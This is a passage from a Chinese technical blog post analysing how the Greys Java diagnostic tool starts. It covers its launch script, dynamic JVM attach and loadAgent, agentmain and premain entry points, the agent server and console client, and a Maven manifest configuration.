<p>然后greys.sh这个脚本会检查greys的版本是否有更新， 除了检查更新就是<code>attach jvm</code>和<code>active console</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;OPTION_ATTACH_JVM&#125;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">    attach_jvm <span class="variable">$&#123;greys_local_version&#125;</span>\</span><br><span class="line">        || exit_on_err 1 <span class="string">"attach to target jvm(<span class="variable">$&#123;TARGET_PID&#125;</span>) failed."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;OPTION_ACTIVE_CONSOLE&#125;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">    active_console <span class="variable">$&#123;greys_local_version&#125;</span>\</span><br><span class="line">        || exit_on_err 1 <span class="string">"active console failed."</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p><code>${OPTION_ATTACH_JVM}</code>和<code>${OPTION_ACTIVE_CONSOLE}</code>的默认值都是1：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># the option to control greys.sh attach target jvm</span></span><br><span class="line">OPTION_ATTACH_JVM=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># the option to control greys.sh active greys-console</span></span><br><span class="line">OPTION_ACTIVE_CONSOLE=1</span><br></pre></td></tr></table></figure>
<h1 id="attach-jvm分析"><a href="#attach-jvm分析" class="headerlink" title="attach jvm分析"></a>attach jvm分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">attach_jvm()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">local</span> greys_lib_dir=<span class="variable">$&#123;GREYS_LIB_DIR&#125;</span>/<span class="variable">$&#123;1&#125;</span>/greys</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if [ $&#123;TARGET_IP&#125; = $&#123;DEFAULT_TARGET_IP&#125; ]; then</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -z <span class="variable">$&#123;TARGET_PID&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java \</span><br><span class="line">            <span class="variable">$&#123;BOOT_CLASSPATH&#125;</span> <span class="variable">$&#123;JVM_OPTS&#125;</span> \</span><br><span class="line">            -jar <span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar \</span><br><span class="line">                -pid <span class="variable">$&#123;TARGET_PID&#125;</span> \</span><br><span class="line">                -target <span class="variable">$&#123;TARGET_IP&#125;</span><span class="string">":"</span><span class="variable">$&#123;TARGET_PORT&#125;</span> \</span><br><span class="line">                -core <span class="string">"<span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar"</span> \</span><br><span class="line">                -agent <span class="string">"<span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-agent.jar"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>attach jvm这个函数，就是调用 greys-core这个jar包，  jar包执行时会调用指定的<code>Main-Class</code>的的main方法。<br><code>Main-Class</code>在<code>META-INF</code>中指定， 查看文件的内容:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  greys  unzip -q -c greys-core.jar  META-INF/MANIFEST.MF</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line">Created-By: Apache Maven</span><br><span class="line">Built-By: vlinux</span><br><span class="line">Build-Jdk: 1.8.0_91</span><br><span class="line">Main-Class: com.github.ompc.greys.core.GreysLauncher</span><br></pre></td></tr></table></figure>
<p>因此执行这个jar包后，会调用<code>GreysLauncher</code>的main方法。</p>
<h2 id="attach到jvm过程"><a href="#attach到jvm过程" class="headerlink" title="attach到jvm过程"></a>attach到jvm过程</h2><p><code>GreysLauncher</code>在main函数中做了两件事情，一是解析命令行配置， 二是attach到具体的jvm上。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> GreysLauncher(args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        System.err.println(<span class="string">"start greys failed, because : "</span> + getCauseMessage(t));</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">GreysLauncher</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">    Configure configure = analyzeConfigure(args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent</span></span><br><span class="line">    attachAgent(configure);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置文件就是脚本中指定的参数，主要有如下字段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String targetIp;                <span class="comment">// 目标主机IP</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> targetPort;                 <span class="comment">// 目标进程号</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> javaPid;                    <span class="comment">// 对方java进程号</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> connectTimeout = <span class="number">6000</span>;      <span class="comment">// 连接超时时间(ms)</span></span><br><span class="line"><span class="keyword">private</span> String greysCore;               <span class="comment">// greys-core.jar的位置</span></span><br><span class="line"><span class="keyword">private</span> String greysAgent;              <span class="comment">// greys-agent.jar的位置</span></span><br></pre></td></tr></table></figure>
<h3 id="attach原理"><a href="#attach原理" class="headerlink" title="attach原理"></a>attach原理</h3><img src="/2018/04/02/greys-start/attach.jpg" title="jps实现原理">
<p>我们在用<code>jstack</code>命令查看jvm的线程dump的时候，经常看到这两个进程，一个是<code>&quot;Signal Dispatcher&quot;</code>, 另外一个是<code>&quot;Attach Listener&quot;</code>;<br>这两个线程就和attach功能密切相关。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os_prio=0 tid=0x00007f23b80d2800 nid=0xb82e runnable [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line">&quot;Attach Listener&quot; #28 daemon prio=9 os_prio=0 tid=0x00007f2328001000 nid=0x3bb5 waiting on condition [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br></pre></td></tr></table></figure>
<p><code>Signal Dispatcher</code>负责响应<code>SIGQUIT</code>, 并创建 <code>Attach Listener</code>。<code>Attach Listener</code>负责建立通信，执行相应的命令。</p>
<p>attach jvm就是根据<code>com.sun.tools.attach.VirtualMachine</code>的接口提供的方法——<code>attach</code>和<code>loadAgent</code></p>
<h3 id="GreysLauncher"><a href="#GreysLauncher" class="headerlink" title="GreysLauncher"></a>GreysLauncher</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Object vmObj = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> == attachVmdObj) &#123; <span class="comment">// 使用 attach(String pid) 这种方式</span></span><br><span class="line">              vmObj = vmClass.getMethod("attach", String.class).invoke(null, "" + configure.getJavaPid());</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              vmObj = vmClass.getMethod(<span class="string">"attach"</span>, vmdClass).invoke(<span class="keyword">null</span>, attachVmdObj);</span><br><span class="line">          &#125;</span><br><span class="line">          vmClass.getMethod("loadAgent", String.class, String.class).invoke(vmObj, configure.getGreysAgent(), configure.getGreysCore() + ";" + configure.toString());</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> != vmObj) &#123;</span><br><span class="line">              vmClass.getMethod(<span class="string">"detach"</span>, (Class&lt;?&gt;[]) <span class="keyword">null</span>).invoke(vmObj, (Object[]) <span class="keyword">null</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>通过上面的代码， <code>greys-core.jar</code>和<code>greys-agent.jar</code>这两个jar包就被引入到了jvm</p>
<blockquote>
<p>The loadAgent method is used to load agents that are written in the Java Language and deployed in a JAR file. (See java.lang.instrument for a detailed description on how these agents are loaded and started).</p>
</blockquote>
<p><code>loadAgent</code>会将<code>greys-core.jar</code>和<code>greys-agent.jar</code>两个jar包引入进来。jar包引入后会从<code>/META-INF/MANIFEST.MF</code>中读取配置的agent类。</p>
<h2 id="agent启动过程"><a href="#agent启动过程" class="headerlink" title="agent启动过程"></a>agent启动过程</h2><p>agent有两种启动方式，一种再jvm启动的时候一起启动， 一种是动态的attach到一个运行的jvm上。</p>
<h3 id="随启动参数启动"><a href="#随启动参数启动" class="headerlink" title="随启动参数启动"></a>随启动参数启动</h3><p>以agent形式启动需要在jvm启动参数添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:btrace-agent.jar</span><br></pre></td></tr></table></figure>
<p>这种加载方式需要实现下面两个接口中的一个：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JVM先尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果上面的方法不存在，则尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure>
<p>同时必须在<code>MANIFEST.MF</code>中包含<code>Premain-Class</code>指定对应的类。</p>
<h3 id="动态attach的方式启动"><a href="#动态attach的方式启动" class="headerlink" title="动态attach的方式启动"></a>动态attach的方式启动</h3><p>attach形式需要实现下面的两个接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 首先尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 上面的方法不存在，会尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure>
<p>同时在Jar包中必须指定 <code>Agent-Class</code>, 因此当此jar包被加载时，jvm会从<code>/META-INF/MANIFEST.MF</code>中读取配置的<code>Premain-Class</code>和<code>Agent-Class</code>, <code>greys-agent</code>的信息显示如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line">Created-By: Apache Maven</span><br><span class="line">Built-By: vlinux</span><br><span class="line">Build-Jdk: 1.8.0_91</span><br><span class="line">Agent-Class: com.github.ompc.greys.agent.AgentLauncher</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.github.ompc.greys.agent.AgentLauncher</span><br></pre></td></tr></table></figure>
<p>因此入口定位在<code>AgentLauncher</code>。</p>
<h3 id="AgentLauncher"><a href="#AgentLauncher" class="headerlink" title="AgentLauncher"></a>AgentLauncher</h3><p><code>AgentLauncher</code>的主要完成了一下的功能：</p>
<pre><code>- 自定义类加载器，减少对现有工程的侵蚀
- 启动一个`GaServer`监听指定的端口
</code></pre><p><code>GaServer</code>读取用户的输入的命令， 将命令交给<code>CommandHandler</code>在新的线程中进行具体的处理。</p>
<h1 id="active-console分析"><a href="#active-console分析" class="headerlink" title="active console分析"></a>active console分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># active console</span></span><br><span class="line"><span class="comment"># $1 : greys_local_version</span></span><br><span class="line">active_console()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">local</span> greys_lib_dir=<span class="variable">$&#123;GREYS_LIB_DIR&#125;</span>/<span class="variable">$&#123;1&#125;</span>/greys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use default console</span></span><br><span class="line">        <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java \</span><br><span class="line">            -cp <span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar \</span><br><span class="line">            com.github.ompc.greys.core.GreysConsole \</span><br><span class="line">                <span class="variable">$&#123;TARGET_IP&#125;</span> \</span><br><span class="line">                <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> telnet 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use telnet</span></span><br><span class="line">        telnet <span class="variable">$&#123;TARGET_IP&#125;</span> <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> nc 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use netcat</span></span><br><span class="line">        nc <span class="variable">$&#123;TARGET_IP&#125;</span> <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"'telnet' or 'nc' is required."</span> 1&gt;&amp;2</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>active console</code>主要是启动一个客户端， 它对不同的方式做了判断; 以java方式启动的会执行<code>greys-core.jar</code>的<code>GreysConsole</code><br>的main方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String... args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> GreysConsole(<span class="keyword">new</span> InetSocketAddress(args[<span class="number">0</span>], Integer.valueOf(args[<span class="number">1</span>])));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>GreysConsole</code>的构造函数中连接到上面启动的<code>GaServer</code>， 将用户输入的命令发送到server端， 然后将server端的返回显示在交互式shell上。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.github.ompc.greys.core.GreysConsole#activeConsoleReader</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送命令到服务端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">activeConsoleReader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread socketThread = <span class="keyword">new</span> Thread(<span class="string">"ga-console-reader-daemon"</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> StringBuilder lineBuffer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (isRunning) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> String line = console.readLine();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 如果是\结尾，则说明还有下文，需要对换行做特殊处理</span></span><br><span class="line">                    <span class="keyword">if</span> (StringUtils.endsWith(line, <span class="string">"\\"</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 去掉结尾的\</span></span><br><span class="line">                        lineBuffer.append(line.substring(<span class="number">0</span>, line.length() - <span class="number">1</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        lineBuffer.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> String lineForWrite = lineBuffer.toString();</span><br><span class="line">                    lineBuffer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// replace ! to \!</span></span><br><span class="line">                    <span class="comment">// history.add(StringUtils.replace(lineForWrite, "!", "\\!"));</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// flush if need</span></span><br><span class="line">                    <span class="keyword">if</span> (history <span class="keyword">instanceof</span> Flushable) &#123;</span><br><span class="line">                        ((Flushable) history).flush();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    console.setPrompt(EMPTY);</span><br><span class="line">                    <span class="keyword">if</span> (isNotBlank(lineForWrite)) &#123;</span><br><span class="line">                        socketWriter.write(lineForWrite + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        socketWriter.write(<span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    socketWriter.flush();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                err(<span class="string">"read fail : %s"</span>, e.getMessage());</span><br><span class="line">                shutdown();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    socketThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    socketThread.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// com.github.ompc.greys.core.GreysConsole#loopForWriter</span></span><br><span class="line"><span class="comment">// 将服务端返回输出到界面</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loopForWriter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (isRunning) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> c = socketReader.read();</span><br><span class="line">            <span class="keyword">if</span> (c == EOF) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (c == EOT) &#123;</span><br><span class="line">                hackingForReDrawPrompt();</span><br><span class="line">                console.setPrompt(DEFAULT_PROMPT);</span><br><span class="line">                console.redrawLine();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.write(c);</span><br><span class="line">            &#125;</span><br><span class="line">            out.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        err(<span class="string">"write fail : %s"</span>, e.getMessage());</span><br><span class="line">        shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="使用maven生成MainFest文件"><a href="#使用maven生成MainFest文件" class="headerlink" title="使用maven生成MainFest文件"></a>使用maven生成MainFest文件</h2><h3 id="maven-jar-plugin"><a href="#maven-jar-plugin" class="headerlink" title="maven-jar-plugin"></a>maven-jar-plugin</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>qtracer-agent<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>qunar.tc.qtracer.instrument.AgentMain<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>qunar.tc.qtracer.instrument.AgentMain<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
